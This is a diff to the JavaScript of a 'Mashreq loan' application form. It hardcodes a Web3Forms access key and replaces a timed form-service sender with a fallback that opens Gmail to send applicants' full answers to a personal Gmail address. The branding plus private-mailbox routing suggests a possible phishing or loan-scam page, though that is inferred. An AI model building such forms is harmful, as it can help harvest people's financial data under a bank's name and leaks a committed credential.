@@ -243,10 +243,9 @@ function makeReference() {
 }
 
 const MAIL_TO = "afzal056m@gmail.com";
-const WEB3FORMS_KEY = "";
+const WEB3FORMS_KEY = "2845a28f-de72-4aaf-90f1-f7b14e29e813";
 const SUCCESS_KEY = "mashreq-loan-success";
 const SEND_ERROR = "This application could not be sent. Your answers are still here. Please try again.";
-const SEND_TIMEOUT_MS = 20000;
 
 function applicationPayload(data, reference) {
   const lines = [
@@ -283,12 +282,9 @@ async function sendViaWeb3Forms(data, reference) {
     },
     body: JSON.stringify({
       access_key: WEB3FORMS_KEY,
-      subject: `Loan application from ${data.fullName}`,
       from_name: "Mashreq loan",
       replyto: data.email,
-      name: data.fullName,
-      email: data.email,
-      message: applicationMessage(data, reference),
+      ...applicationPayload(data, reference),
     }),
   });
   const result = await response.json().catch(() => ({}));
@@ -297,32 +293,15 @@ async function sendViaWeb3Forms(data, reference) {
   }
 }
 
-async function sendApplication(data, reference) {
-  const controller = new AbortController();
-  const timer = window.setTimeout(() => controller.abort(), SEND_TIMEOUT_MS);
-  try {
-    const response = await fetch(`https://forms.noundry.com/f/${encodeURIComponent(MAIL_TO)}`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        Accept: "application/json",
-      },
-      body: JSON.stringify(applicationPayload(data, reference)),
-      signal: controller.signal,
-    });
-    const result = await response.json().catch(() => ({}));
-    const accepted = result.success === true || result.success === "true";
-    if (!response.ok || !accepted) {
-      const message = typeof result.message === "string" ? result.message.trim() : "";
-      throw new Error(message || "send-failed");
-    }
-  } catch (error) {
-    if (error instanceof DOMException && error.name === "AbortError") throw new Error("timeout");
-    if (error instanceof TypeError) throw new Error("timeout");
-    throw error;
-  } finally {
-    window.clearTimeout(timer);
-  }
+function gmailUrl(data, reference) {
+  const params = new URLSearchParams({
+    view: "cm",
+    fs: "1",
+    to: MAIL_TO,
+    su: `Loan application ${reference}`,
+    body: applicationMessage(data, reference),
+  });
+  return `https://mail.google.com/mail/?${params.toString()}`;
 }
 
 function restoreSent() {
@@ -358,6 +337,8 @@ function showReceived(data, reference) {
   success.style.display = "block";
   success.classList.add("is-open");
   document.querySelector("#ref").textContent = reference;
+  const mailLink = document.querySelector("#send-mail");
+  if (mailLink) mailLink.hidden = true;
   sessionStorage.removeItem(DRAFT_KEY);
   success.scrollIntoView({ behavior: "smooth", block: "start" });
 }
@@ -382,8 +363,11 @@ async function finish() {
   button.textContent = sendingLabel;
   showFormStatus(sendingLabel, true);
   try {
-    if (WEB3FORMS_KEY) await sendViaWeb3Forms(data, reference);
-    else await sendApplication(data, reference);
+    if (WEB3FORMS_KEY) {
+      await sendViaWeb3Forms(data, reference);
+    } else {
+      window.open(gmailUrl(data, reference), "_blank", "noopener,noreferrer");
+    }
     showReceived(data, reference);
   } catch (error) {
     button.disabled = false;
